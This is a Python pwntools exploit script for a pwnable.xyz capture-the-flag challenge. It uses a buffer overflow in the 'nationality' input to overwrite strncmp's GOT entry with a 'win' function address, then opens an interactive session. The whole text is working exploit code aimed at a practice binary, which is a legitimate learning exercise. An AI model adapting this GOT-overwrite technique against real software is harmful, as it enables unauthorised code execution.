from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30031)

sla = r.sendlineafter
sa = r.sendafter

win = 0x40099c
strncmp_got = 0x603018

sla('> ', '2')
sla('nationality: ', b'a' * 0x10 + p64(strncmp_got))

sla('> ', '3')
sla('age: ', str(win))

sla('> ', '4')

r.interactive()